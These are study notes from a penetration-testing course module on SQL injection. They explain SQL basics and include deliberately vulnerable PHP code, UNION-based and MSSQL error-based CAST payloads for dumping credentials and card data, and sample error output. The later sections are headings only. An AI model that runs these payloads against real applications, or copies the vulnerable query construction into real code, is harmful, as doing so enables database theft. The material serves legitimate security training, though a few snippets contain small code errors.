# [ECPPT](https://members.elearnsecurity.com/courses/penetration_testing_professional_v5)
___________________________________
# Web App Security
# Module 4 - SQL Injection

https://cdn.members.elearnsecurity.com/ptp_v5/section_5/module_4/html/index.html

###### Module Map
1. Introduction to SQL Injection
2. Finding SQL Injection
3. Exploiting In-Band SQL Injection
4. Exploiting Error-Based SQL Injection
5. Exploiting Blind SQL Injection
6. SQLMap
7. Mitigation Strategies
8. From SQLi to Server Takeover

____________________________________________________
## 4.1. Introduction to SQL Injection
An **SQL Injection (SQLi)** attack exploits the injection of SQL commands into SQL queries of a web application. A successful SQLi attack lets a malicious hacker access and manipulate a web application's backend database.

Complex web applications generally use database for storing data, user credentials, or statistics; CMSs as well as simple personal web pages can connect to databases such as *MySQL*, *SQL Server*, *Oracle*, *PostgreSQL*, and others.

To interact with databases, entities such as systems operators, programmers, applications, and web applications use **Structured Query Language (SQL)**

SQL is a powerful interpreted language used to extract and manipulate data from a database. Web applications embed SQL commands, also known as queries, in their server side code.

The code takes care of establishing and keeping the connection to the database by using **connectors**. Connectors are middle-ware between the web application and the database.
  Connector example:
    ```
                      Application
                  ^        ^        ^
                  |        |        |
                  V        |        |
          Driver Manager   |        |
                  ^        |        |
                  |        V        |
                  |      DNS        |
                  |  Configuration  |
                  |        ^        |
                  |        |        |
                  V        V        V
                    Connector/ODBC
                           ^
                           |
                           V
                     MySQL Server
    ```

Before learning how to carry out an attack, we have to know some SQL basics:
- SQL statement syntax
- How to perform a query
- How to *union* the results of 2 queries
- The *DISTINCT* and *ALL* operators
- How comments work

#### 4.1.1. SQL Statements
You can find more information about SQL [here](http://www.w3schools.com/sql/sql_intro.asp)

It is also possible to select constant values:
  ```
  SELECT 22, 'string', 0x12, 'another string';
  ```

You also need to know the **UNION** command, which performs a union between 2 results, operates:
  ```
  <SELECT statement> UNION <other SELECT statement>;
  ```

If a table or query contains duplicate rows, you can use the
  ```
  SELECT **DISTINCT** <field list> <remainder of statement>;
  ```

A *UNION* statement implies *DISTINCT* by default. You can prevent that by using the **ALL** operator:
  ```
  <SELECT statement> UNION ALL <other SELECT statement>;
  ```

Finally a word about **comments**. There are 2 strings you can use to comment a line in SQL:
  - `#` (the hash symbol)
    ```
    SELECT field FROM table; # this is a comment
    ```
  - `-- ` (two dashes followed by a space)
    ```
    SELECT field FROM table; -- this is a comment
    ```

**Example:**
  In the following slides, we will see some SQL queries performed on a database containing 2 tables:
  **Products**
    |ID  |Name    |Description     |
    |----|--------|----------------|
    |1   |Shoes   |Nice shoes      |
    |3   |Hat     |Black hat       |
    |18  |T-Shirt |Cheap           |

  **Accounts**
    |Username |Password |Email             |
    |---------|---------|------------------|
    |admin    |HxZsO9AR |admin@site.com    |
    |staff    |ihKdNTU4 |staff@site.com    |
    |user     |lwsi7Ks8 |usr@othersite.com |


  The following 2 queries provide the same result:
    ```
    SELECT Name, Description FROM Products WHERE ID='1';
    SELECT Name, Description FROM Products WHERE Name='Shoes';
    ```

  This is a **UNION** example between 2 SELECT statements:
    ```
    SELECT Name, Description FROM Products WHERE ID='3' UNION SELECT Username, Password FROM Accounts;
    ```

  You can also perform a UNION operation with some chosen data:
    ```
    SELECT Name, Description FROM Products WHERE ID='3' UNION SELECT 'Example', 'Data';
    ```

#### 4.1.2. SQL Queries Inside Web Applications
The previous examples show how to use SQL when querying a database directly from its console.

To perform the same tasks from within a web application, the application must:
- **Connect** to the database
- **Submit** the query to the database
- **Retrieve** the results

Then the application logic can use the results.

The following code contains a PHP example of a connection to a MySQL database and the execution of a query.
  Example:
    ```
    $dbhostname = '1.2.3.4';
    $dbuser = 'username';
    $dbpassword = 'password';
    $dbname = 'database';

    $connection = mysqli_connect($dbhostname, $dbpassword, $dbname);
    $query = "SELECT Name, Description FROM Products WHERE ID='3' UNION SELECT Username, Password FROM Accounts;";

    $results = mysqli_query($connection, $query);
    display_results($results);
    ```

The previous example shows a **static query** example inside a PHP page:
- `$connection` is an object referencing the connection to the database
- `$query` contains query
- `mysqli_query` is a function which submits the query to the database
- Finally the custom `display_results()` function renders the data

Anatomy of a database interaction in PHP. This example uses a MySQL database:
  ```
  // Configuration
  $dbhostname = '1.2.3.4';
  $dbuser = 'username';
  $dbpassword = 'password';
  $dbname = 'database';

  $connection = mysqli_connect($dbhostname, $dbpassword, $dbname); // Connection
  $query = "SELECT Name, Description FROM Products WHERE ID='3' UNION SELECT Username, Password FROM Accounts;"; // Query definition

  $results = mysqli_query($connection, $query); // Submit
  display_results($results); // Usage
  ```

#### 4.1.3. Vulnerable Dynamic Query

However, most of the times queries are not static, they are **dynamically built** by using the user's inputs. Here you can find a **vulnerable** dynamic query example:
  ```
  $id = $_GET['id'];

  $connection = mysqli_connect($dbhostname, $dbpassword, $dbname);
  $query = "SELECT Name, Description FROM Products WHERE ID='$id';";

  $results = mysqli_query($connection, $query);
  display_results($results);
  ```

  The previous example shows some code which uses **user supplied input to build a query** (the *id* parameter of the GET request). The code then submits the query to the database.

  Although the code is functionally correct, this behavior is very dangerous, because a malicious user can exploit the query construction to take control of the database interaction.

  Let us see how!

The dynamic query:
  ```
  SELECT Name, Description FROM Products WHERE ID='$id';
  ```
  Expects *$id* values such as:
  - `1` => `SELECT Name, Description FROM Products WHERE ID='1';`
  - `Example` => `SELECT Name, Description FROM Products WHERE ID='Example';`
  - `Itid3` =>`SELECT Name, Description FROM Products WHERE ID='Itid3';`
  Or any other string.

But what if the attacker crafts a `$id` value which can actually **change** the query?
  Something like:
    ```
    ' OR 'a'='a
    ```
  Then the query becomes:
    ```
    SELECT Name, Description FROM Products WHERE ID='' OR 'a'='a';
    ```

  This tells the database to select the items by checking two conditions:
  - The id must be empty (`id=''`)
  - **OR** an always true condition (`'a'='a'`)

  While the first condition is not met, the SQL engine will consider the second condition of the OR. This second condition is crafted as an always true condition.

  In other words, this tells the database to select all the items in the *Product* table!

An attacker could also exploit the UNION command by supplying:
  ```
  UNION SELECT Username, Password FROM Accounts WHERE 'a'='a
  ```
  Thus changing the query to:
  ```
  SELECT Name, Description FROM Products WHERE ID='' UNION SELECT Username, Password FROM Accounts WHERE 'a'='a';
  ```

  This asks the database tot select the items with an **empty** id, thus selecting an empty set, and then to perform a union with all the entries in the *Accounts* table.

  By using some deep knowledge about the database management system in use, an attacker can get access to the entire database just by using a web application.

#### 4.1.4. How Dangerous is a SQL Injection
Before going deeper into the **find and exploit process** of SQL injection vulnerabilities, you should understand where these vulnerabilities can lead when they are successfully exploited.

First, we have to understand that based on the DBMS that the web application is using (MySQL, SQL Server,...), the attacker is capable of performing a number of actions that go much further than the mere manipulation of the database.

  An attacker could read the file systems, run OS commands, install shells, access the remote network, and basically own the whole infrastructure.

  This is not always the case however, as we will see later, the more powerful the DBMS, the more advanced the SQL is.
  This increases the capabilities of an attacker after the exploitation.

  Keep in mind that accessing a database that stores confidential data (user credentials, SSNs, credit cards, and whatever sensitive information an enterprise, company, or individual may store in a database) is the single most dangerous form of attack on a web application.

Among all the vulnerabilities that may affect web applications, SQL injections are the **first checked by hackers** because of the fact that they produce the most immediate results.
  Example:
    An XSS attacks involves some steps, intelligence, and planning for its successful exploitation. An SQL injection vulnerability, once found, is ready to be exploited.

#### 4.1.5. SQLi Attack Classification
There is a great deal of literature about SQLi and there are many different types of classifications, each one based on different aspects such as:
- Scope of the attack
- Exploitation vector
- Source of the attack

In this section we will refer 3 different **injection attacks and exploitation** types:
- **In-band**
- **Error-based**
- **Blind SQL**

These classifications are based on the exploitation method used to carry out the attack. This will help you follow the explanations of the detection and exploitation phases. Now let's see it in detail!

**In-band SQL Injection** leverage the same channel used to inject the SQL code (i.e. the pages generated by the web application).
  Example:
    During an in-band attack the penetration tester finds a way to ask the web application for the desired information.

During an **Error-Based SQL Injection Attack**, the penetration testers tries to force the DBMS to output an error message and then uses that information to perform data exfiltration.
  Example:
    To exploit an error-based injection, the penetration tester needs to use advanced DBMS features. Errors could be sent either via the **web application output or by other means** such as automated reports or warning emails.

A web application vulnerable to **blind SQL injection** does not reflect the results of the injection on the output. In this case the penetration tester must find an **inference** method to exploit the vulnerability.
  Example:
    Inference exploitation is usually carried out by using true/false conditions.
    The penetration tester can understand if a condition is true or false by studying the web application behavior.

____________________________________________________
## 4.2. Finding SQL Injection
To exploit an SQL Injection you have to first find out where the **injection point** is, then you can craft a **payload** to take control over your target's dynamic query.

The most straightforward way to find SQL injections within a web application is to probe its inputs with characters that are known to cause the SQL query to be syntactically invalid and thus forcing the web application to return an error

Note: Not all the inputs of a web applications are used to build SQL queries. In the *Information Gathering* module, we suggested that you categorize the different input parameters and save the ones used for database data retrieval and manipulation.

In the following slides, we will see how to use the information gathered to identify and exploit SQLi vulnerabilities.

Input parameters are carried through: **GET and POST requests, HEADERS and COOKIES**.
We have to check all these channels where data is retrieved from the client.

The following examples, for the sake of simplicity, will examine scenarios where inputs are taken straight from the URL (with the GET method). The same techniques apply to other channels.

#### 4.2.1. Simple SQL Scenario
For the purpose of explaining the process of finding SQL Injections, we created a small (vulnerable) e-commerce web application showing cell phones for sale.
  Example:
    `ecommerce.php` takes an input parameter named `id` that read the product features from the database and prints them out on the page.

    The `id` parameter is expected to be an integer.
    Sending the `id=1` GET parameter makes the application behave correctly. (see img-50)

    When sending a comma (`id=,`) however, makes the application throws an error.(see img-51)

Testing input for SSQL injection means trying to inject:
- String terminators: `'` and `"`
- SQL commands: **SELECT**, **UNION**, and others
- SQL comments: `#` or `--`

And checking if the web application starts to behave oddly.

Always test **one injection at the time!** Otherwise you will not be able to understand what injection vector is successful.    

#### 4.2.2. SQL Errors in Web Applications
The web application we have just seen, prints internal errors on its input pages.
This behavior helps developers **and penetration testers** to understand what is going on under the hood of a web application.

Every DBMS responds to incorrect SQL queries with different **error messages**.

Even within the same DBMS, error messages change according to the specific function the web application uses to interact with it.

Example:
  In the previous example we saw the `mysql_fetch_assoc()` function triggering an error due to our invalid input.

  A typical error from **MS-SQL** looks like this:
    ```
    Incorrect syntax near [query snippet]
    ```
  While a typical **MySQL** looks more like this:
    ```
    You have an error in your SQL syntax. Check the manual that corresponds to your MySQL server version for the right syntax to use near [query snippet]
    ```

If during an engagement, you find error similar to the previous one, it is very likely that the application is vulnerable to an SQL injection attack.

This is not always the case, sometimes you have to have **educated guesses** in order to understand if a  web app is vulnerable or not.

#### 4.2.3. Boolean Based Detection
Currently, most production web sites do not display such errors.
This happens both because of the usability of the application, it is useless to display errors to end users who cannot understand or fix them, and to achieve **security through obscurity**.

**Security through obscurity** is the use of secrecy of design, implementation or configuration in order to provide security.
In the following slides you will see how this approach cannot defend a vulnerable application from **SQL injection attacks**.

If a web application does not display errors in its output, it is still possible to test for SQL injection by using a **Boolean based detection technique**.

The idea behind this process is simple, yet clever: trying to craft payloads which transform the web application queries into True/False conditions. The penetration tester then can infer the results of the queries by looking at how the application behavior changes with different True/False conditions.
  Example:
    To demonstrate how to detect a Boolean based SQLi, we created a website hosting an image gallery. Every images has an ID that identifies it (`id=1444`). (see img-60)

    As usual, we try to detect the injection point by sending the web application SQL-reserved characters. In this example, a string termination character (`id=1444'`). The result is: The web application does not display an image. (see img-62)

    Unfortunately, the application behaves in the same way when we ask for an image that simply does not exist. For example, if we pass `id=999999` as GET parameter.

    We suspect that the query behind the page is something like
      ```
      SELECT <some fields> FROM <some table> WHERE id='GETID';
      ```

    So we can try to inject `999999'` or `'1'='1` to transform the query into:
      ```
      SELECT <some fields> FROM <some table> WHERE id='999999 or '1'='1';
      ```

    Which basically is an **always true condition**.

  Testing this payload on the web application gives us back an output! To be sure, we also need to test an always false condition

    We then change our payload to `999999'` or `'1'='1` which is an **always false condition**:
      ```
      SELECT <some fields> FROM <some table> WHERE id='999999 or '1'='2';
      ```

  It is also possible to test a little more with other always true or always false conditions such as:
  - `1141' and 'els'='els`
  - `1141' and 'els'='elsec`
  - `1141' and 'hello'='hello`
  - `1141' and 'hello'='bye`
  - `els' and '1'='1`
  - `els' and '1'='2`

After detecting a potential injection point, it is time to test if it is actually possible.
In the following chapters, you will see different techniques to exploit SQL injection vulnerabilities.

____________________________________________________
## 4.3. Exploiting In-Band SQL Injection
**In-band SQL injection** techniques make the retrieval of data from the database very powerful thanks to the use of the **UNION** SQL command. For this reason, in-band injections are also known as *UNION-based SQL injection*.

This kind of attack lets penetration tester extract the database content, in the form of the database name, tables schemas, and actual data.

As we have seen in the first chapter of this module, the *UNION* statement combines the result-set of two or mote *SELECT* statements.
  Example:
    ```
    SELECT <field list> FROM <table> UNION SELECT <field list> FROM <another table>;
    ```
#### 4.3.1. First Scenario
We will see how to exploit an in-band SQL injection by studying some scenarios.
  In the first scenario the database contains 2 tables: `CreditCards` and `Users`.
    **CreditCards**
    |id(int)|username(string)|password(string)|real_name(string)|
    |-------|----------------|----------------|-----------------|
    | 1     | admin          |strongpass123   |Armando Romeo    |
    | 2     | fred           |wowstrongpass123|Fred Flintstone  |

    **Users**
    |user_id(int)|Cc_num(int)        |CVS(int)|
    |------------|-------------------|--------|
    | 1          |0000 1111 2222 3333| 123    |
    | 2          |0123 4567 8901 2345| 321    |

  The *user_id* column is the foreign key of the *Users* table.
  In this example *admin* has a credit card number of *0000 1111 2222 3333* while *fred* has a credit card number of *0123 4567 8901 2345*.
    **CreditCards**
    |id(int)|username(string)|password(string)|real_name(string)|
    |-------|----------------|----------------|-----------------|
    | 1     | admin          |strongpass123   |Armando Romeo    |
    | 2     | fred           |wowstrongpass123|Fred Flintstone  |

    **Users**
    |user_id(int)|Cc_num(int)        |CVS(int)|
    |------------|-------------------|--------|
    | 1          |0000 1111 2222 3333| 123    |
    | 2          |0123 4567 8901 2345| 321    |

  The web application uses the following code to display usernames:
    ```
    <?php
    $rs=mysql_query("SELECT real_name FROM users WHERE id=".$_GET['id'].";");
    $row=mysql_fetch_assoc($rc);


    echo $row['real_name'];
    ?>
    ```
    As you can see, there is a clear SQL injection point in the id field of the SQL query.

  We can now exploit the SQLi vulnerability to retrieve the credit card associated with a username. Our payload is:
    ```
    9999 UNION ALL SELECT cc_num FROM CreditCards WHERE user_id=1
    ```

  The payload makes the query in the web application transform into the following:
    ```
    SELECT real_name FROM users WHERE id=9999 UNION ALL SELECT cc_num FROM CreditCards WHERE user_id=1;
    ```

    As there are no *users* with *id=9999* the web application will display on its output the *cc_num* of the first user.

  We can now submit the payload to the web application by sending a *GET request* with either the browser or, via different tool:
    ```
    /vuln_to_inband.php?id=9999 UNION ALL SELECT cc_num FROM CreditCards WHER user_id=1
    ```
    Note the use of `ALL` operator. We used it to avoid the effect of an eventual *DISTINCT* clause in the original web application query.

  Another good trick to use when exploiting a SQL injection vulnerability is to use **comments**. A payload such as:
    ```
    9999 UNION ALL SELECT cc_num FROM CreditCards WHERE user_id=1; -- -
    ```
    This comments out any other SQL code which could follow our injection point.

#### 4.3.2. In-band Attack Challenges
There are many things to note in the previous attack:
- The field types of the second SELECT statement  should match the ones in the first statement
- The number of fields in the second SELECT statement should match the number of fields in the first statement
- To successfully perform the attack, we need to know the structure of the database in terms of tables and column names

To solve the first two issues, we can use an advanced technique to find what columns are used in a *SELECT* statement. We are looking for the number of columns and their type.

We will see how to reverse-engineer the database structure later. In the following examples we assume that we know the structure of the database.

##### 4.3.3. Enumerating the Number of Fields in a Query
Let us see how to **enumerate** the number of columns, or field, in query selects.
  The following line contains the vulnerable query:
    ```
    mysql_query("SELECT real_name FROM users WHERE id=".$_GET['id'].";");
    ```
    The columns have the following data types:
    - `id` has data type `int`
    - `real_name` has data type `varchar` (a string)

  In this case, the query selects two columns with type `integer` and `varchar`.
  As most engagements are black-box penetration tests, we need a way to find:
  - Number of columns a vulnerable query selects
  - The data type of each column

  Finding the number of fields in a query is a cyclical task.

  If we do not provide the correct number of fields in the injected query, it will not work. This will throw an error on the web application output or simply mess up the contents of the output page rendering.

  If the web application outputs an error, please note that every DBMS outputs a different error string:
    **MySQL** error:
      ```
      The used SELECT statements have a different number of columns
      ```
    **MS SQL** error:
      ```
      All queries in an SQL statement containing a UNION operator must have an equal number of expressions in their target lists.
      ```
    **PostgreSQL** error:
      ```
      ERROR: each UNION query must have the same number of columns
      ```
    **Oracle** error:
      ```
      ORA-01789: query block has incorrect number of result columns
      ```

  We start by injecting a query that selects *null* fields.
  We start with a single field and then increase the number of fields until we build a valid query.
    Example:
      Detecting the number of fields needed to exploit an in-band SQL injection looks like the following:
      1. `999 UNION SELECT NULL; -- -`
      2. `999 UNION SELECT NULL, NULL; -- -`
        ...
      4. `999 UNION SELECT NULL, NULL, NULL, NULL; -- -`

      We can iteratively add null fields until the error disappears.
      This will force the web application to execute the following queries:
      - `SELECT id, real_name FROM users WHERE id='999' UNION SELECT NULL; -- -`
        Which triggers an error (the left hand query selects two field while the right hand query selects just one field)
      - `SELECT id, real_name FROM users WHERE id='999' UNION SELECT NULL, NULL; -- -`
        Which triggers an error (the left hand query selects two field while the right hand query selects just one field)

#### 4.3.4. Blind Enumeration
However, what about a web application that does not display errors?
  The basic idea is similar (increasing the number of fields at every step) but, in this case, we want to start with a **valid id** and then inject our query.

  As we did before, we increase the number of fields selected until we create a valid query.
    Example:
      The `view.php` page displays a picture with `id` 1338 (see img-90)

      We try to inject a query with a single field.
        The payload is: `1138' UNION SELECT null; -- -`
        The page is not rendered correctly, there must be an error in the query.

      We increase the number of fields.
        The payload is: `1138' UNION SELECT null,null; -- -`
        The page now works, this means that the query is correct.

      With our last payload we forced the web application to run the following query:
        ```
        SELECT field1, field2 FROM table WHERE id='1138' UNION SELECT null, null; -- - <remainder of the original query>
        ```

#### 4.3.5. Identifying Field Types
After identifying the number of fields, we need to find their **type**.
Most of the DBMSs perform type enforcing on the queries.
  Example:
    If the DBMS performs type enforcing on *UNION* statements you cannot perform a *UNION* between an integer and a string. Therefore,
      ```
      SELECT 1 UNION 'a';
      ```
    will trigger an error!

Depending on how the DBMS handles data types, we are required to provide an exact match of the data types for each column in the two **SELECT** statement.
  |DBMS         |Type Enforcing|
  |-------------|--------------|
  |MySQL        | No           |
  |MS SQL Server| Yes          |
  |Oracle       | Yes          |
  |PostgreSQL   | Yes          |

Finding the data types used in the queries is, once again, a cyclical process. We have to:
- Substitute one of the `null` fields in our payload with a constant
- If the constant type used is correct, the query will work
- If the type is wrong the web application will output an error or misbehave

In the next example, we will try to find the data types used in a query.

We found an in-band SQL injection with two fields.
  Our current payload is:
    ```
    ' UNION SELECT null, null, -- -
    ```
  So we try to test if the first field is an integer by sending:
    ```
    ' UNION SELECT 1, null; -- -
    ```

  If the web application works correctly we can assume that the first field is an integer so we proceed from:
    ```
    ' UNION SELECT 1, null; -- -
    ```
  To:
    ```
    ' UNION SELECT 1, 1; -- -
    ```

  If we get an error, or the application misbehaves, then the second field is not an integer therefore, we can move on to:
    ```
    ' UNION SELECT 1, 'a'; -- -
    ```

    As we see from this example, the second field is a string!

#### 4.3.6. Dumping the Database Content
After finding out the number of columns and their types, it is possible to extract information about the database, the server, and the database data.

We will see how to use specific DBMS features to extract this information later. Let us first cover other exploitation techniques.

(see vid-101)

____________________________________________________
## 4.4. Exploiting Error-Based SQL Injection
**Error-based SQL injections** are another way to retrieve data from the database. While they do not ask for data directly, they actually use some advanced DBMS functions to trigger an error. The error message contains the information the penetration tester is aiming for.

Most of the times the error message is reflected on the web application output, but it could also be embedded in an email message or appended to a log file. It depends on how the web application is configured.

Error-based SQL injection is one of the fastest ways to extract data from a database. It is available on DBMSs such as Oracle, PostgreSQL, and MS SQL Server.

Some DBMSs are very generous in terms of information given within error message. In some of the previous examples, we used errors to match conditions of success or failure.

This time, we will retrieve **database names**, **schemas**, and **data** from the errors themselves. We will see some MS SQL Server specific payloads and then introduce some attack vectors for other DBMSs. The basic principle is the same across any DBMS.

#### 4.4.1. MS SQL Server Error-based Exploitation
**MS SQL Server** reveals the name of database objects within error messages.
Let us see it in action.

We ported our vulnerable e-commerce application to ASP+MSSQL to show the process of dumping the whole database schema and data manually.

The schemas are databases with the singular purpose of describing all other user-defined databases in the system.

In MSSQL, **sa** is the super admin and has access to the *master* database. The *master* database contains schemas of user-defined databases.

The first piece of information we would like to know is the database version so that we can build our exploits accordingly.
To do this, we will force the DBMS to show an **error** including the database version.

  One of the most used tricks is to **trigger a type conversion error** that will reveal to us the wanted value.

  From now on we will refer to this scenario:
  - DBMS is MS SQL Server
  - The vulnerable app is `ecommerce.asp?id=1`
  - The id parameter is vulnerable to SQLi

Steps:
1. **The CAST Technique**
The injection payload used for this technique is as follows:
  ```
  9999999 or 1 in (SELECT TOP 1 CAST(<FIELDNAME> as varchar(4096)) from <TABLENAME> WHERE <FIELDNAME> NOT IN (<LIST>)); --
  ```
  This payload is used as input to the vulnerable parameter of the web app: `ecommerce.asp?id=PAYLOAD`.

  We can now dissect the payload to understand all its parts.
    - *Returning no records* (`9999999`)
      `9999999` is just a bogus value, you can put anything here, provided that it is not an id present in the database (we want the `OR` part of the SQL query to be executed, so the first condition should be `FALSE`)

    - *Triggering an Error* (`or 1 in`)
      This is the part of the SQL that will trigger the error.
      We are asking the database to look for integer value 1 within a `varchar` column

    - *Casting* (`CAST(<FIELDNAME> as varchar(4096))`)
      This is where we insert the column that we want to dump.
      (Either a column of a user defined database or a "special" database column).
      `<FIELDNAME>` can be a SQL function like `user_name()` or a variable like `@@version`

    - *Narrowing down* (`WHERE <FIELDNAME> NOT IN (<LIST>)`)
      We will use this part in the iterations to dump the database data.
      This part can be omitted/adjusted at our disposal according to which table our searched fieldname value belongs to.

2.  **Retrieving the SQL Server Version**
  ```
  9999999 or 1 in (SELECT TOP 1 CAST(<FIELDNAME> as varchar(4096))) --
  ```
  This is a very simple example of how to use this type of payload.
  We used the `@@version` variable name

  Running this payload on the vulnerable web application makes it print the output:
    ```
    [Microsoft][SQL Server Native Client 10.0][SQL Server]Conversion failed when converting the varchar value 'Microsoft SQL Server 2008 R2 (SP2) - 10.50.4000.0 (x64) Jun 28 2012 08:36:30 Copyright (c) Microsoft Corporation Express Edition (64-bit) on Windows NT 6.1 (Build 7601: Service Pack 1) (Hypervisor)' to data type int.
    ```
    Thus, printing the DBMS version.

  Knowing the database version is really important because it helps you during the exploitation phase.
    Example:
      Different MS SQL Server versions have different default column names in the *master* database.

      We can find information about the structure of the *master* database on [MSDN](https://msdn.microsoft.com/en-us/library/ms187837.aspx)

3. **Dumping the Database Data**
  In the following section, we will see how to extract information from a database by using error-based SQL injections:
  - Current database username
  - Current database name
  - Installed databases
  - The tables into a given database
  - The columns of a given table
  - Database data

  We can now see how to extract various information via error-based SQL injections by using CAST technique

  In the following examples we will attack a vulnerable web application: http://somesite.xxx/vuln.php?id=1

  The `id` parameter is vulnerable, therefore we will inject our payloads via a web browser.

  Steps:
  1. Finding the Current Username
    The first step is to understand the level of privilege we have, by finding the current database user:
      ```
      9999 or 1 in (SELECT TOP 1 CAST (user_name() as varchar(4096))) --
      ```
      `User_name()` is a MS SQL function which returns the current database user.

      This is the output of the application:
        ```
        [Microsoft][SQL Server Native Client 10.0][SQL Server]Conversion failed when converting the varchar value 'user' to data type int.
        ```

      The current database user is just `user`, so we do not have administrative privileges (as the *sa* would have).
      We can still dump all the databases to which *user* has access to.

  2. Finding Readable Database
    So the next step is enumerating the databases that *user* can access.
    To do that, we will iterate through the *MASTER* database to find all the databases that we can read. The payload is:
      ```
      9999 or 1 in (SELECT TOP 1 CAST (db_name(0) as varchar(4096))) --
      ```
      The `DB_NAME()` function accesses the *master..sysdatabses* table which stores all the databases installed on the server. We can only see the database that *user* has rights to.

    To enumerate all the databases that *user* can access, we just have to increment the `db_name()` argument:
      ```
      9999 or 1 in (SELECT TOP 1 CAST (db_name(1) as varchar(4096))) --
      ```
      Cycle trough 1, 2, 3, and continue until we cannot enumerate any more databases.


  3. Enumerating Database Tables
    We now have a list of installed databases and the current database in use.

    This time, we want to **enumerate all the tables in the current database** (the same technique can easily be modified to apply to other databases)

    We will use the following payload scheme:
      ```
      9999999 or 1 in (SELECT TOP 1 CAST(name as varchar(4096)) FROM <database name>..sysobjects WHERE xtype='U' and name NOT IN (<known table list>)); --
      ```
      Description:
      - `xtype='U'`
        Means that we are only interested in user-defined variables
      - `name NOT IN ('<known table list>')`
        Name is a column of the `sysobjects` special table. Every time we find a new table we will append it to the NOT IN list. This is needed because the error displays only the first table name.

        Example:
          If a database contains three tables:
          - HR
          - Customers
          - Products
          `<known table list>` will:
          - Be empty in the first payload. `... name NOT IN ('')`  will work!
          - Contain `HR` at the second step
          - Contain `HR`, `Customer`, `Products` at the last step

    4. Enumerating Columns
      After retrieving the tables of a database, it is also possible to recover the columns of each table. This is the *schema* of the database and we can retrieve it by using the following payload template:
        ```
        9999 or 1 in (SELECT TOP 1 CAST (<db_name>..syscolumns.name as varchar(4096)) FROM <db_name>..syscolumns,<db_name>..sysobjects WHERE <db_name>..syscolumns.id=<db_name>..sysobjects.id AND  <db_name>..sysobjects.name=<table name> AND <db name>..syscolumns.name NOT IN (<known column list>)); --
        ```
        Description:
        - `<db name>` is the name of the database we are working on
        - `<table name>` is the name of the table which we are studying
        - `<known column list>` is a list of the columns we already retrieved

    5. Dumping Data
      After enumerating the databases and their schemas, we can proceed to the data dumping phase.

      To retrieve the actual content of the database, we need to use the knowledge we obtained of the database structure.
      We will, again, trigger some errors by using the cast technique.

      You can dump the data by using the same technique we have seen for schema enumeration:
        ```
        9999999 or 1 in (SELECT TOP 1 CAST(<column name> as varchar(4096)) FROM <database name>..<table name> WHERE <column name> NOT IN (<retrieved data list>)); -- -
        ```
        Let us see a couple of tricks to trigger error depending on the field data type.

        Example:
          In this example we exploited `page.php?id=1` and identified a table called **users** in the database **cms**.
          The table contains the following columns:
          - `id` (int)
          - `username` (varchar)
          - `password` (varchar)

          To retrieve the `id` values, you can use the following payload:
            ```
            9999999 or 1 in (SELECT TOP 1 CAST(id as varchar)%2bchar(64) FROM cms..users WHERE id NOT IN ('')); -- -
            ```
            Please note the concatenation of the `id` value with `@`.
            This **ensures that the selected id has data type varchar** thus making the cast error possible!

            Sending `%2b` to the web application means sending the `+` character to the DBMS. The `+` character serves as string concatenation command.

              So the resulting error is something like:
              ```
              [Microsoft][SQL Server Native Client 10.0][SQL Server]Conversion failed when converting the varchar value '1@' to data type int.
              ```

          Then we can proceed with the usual method. We filter out the id we already have:
            ```
            9999999 or 1 in (SELECT TOP 1 CAST(id as varchar)%2bchar(64) FROM cms..users WHERE id NOT IN ('1')); -- -
            ```

            So the resulting error is something like:
            ```
            [Microsoft][SQL Server Native Client 10.0][SQL Server]Conversion failed when converting the varchar value '1@' to data type int.
              ```

          After extracting all the ids, we can use this information to extract all the usernames:
            ```
            9999999 or 1 in (SELECT TOP 1 CAST(username as varchar) FROM cms..users WHERE id=1); -- -
            ```
            No string concatenation is needed here, because *username* data type is varchar. Using the ids, lets us correlate usernames and passwords by retrieving the password of a specific username.

          We can retrieve a password by using pretty much the same payload we used for the username:
            ```
            9999999 or 1 in (SELECT TOP 1 CAST(password as varchar) FROM cms..users WHERE id=1); -- -
            ```

          Or even **concatenate the username and password**:
            ```
            9999999 or 1 in (SELECT TOP 1 CAST(username%2bchar(64)password as varchar) FROM cms..users WHERE id=1); -- -
            ```

In the following video you will see how to manually exploit error-based SQL injections.
You will see different ways to trigger errors, and some applied payload examples. Moreover, you will see how to submit your payload via the browser and a command line utility.

(see vid-139)

#### 4.4.2. MySQL Error-Based SQLi Exploitation





____________________________________________________
## 4.5. Exploiting Blind SQL Injection



____________________________________________________
## 4.6. SQLMap



____________________________________________________
## 4.7. Mitigation Strategies



____________________________________________________
## 4.8. From SQLi to Server Takeover
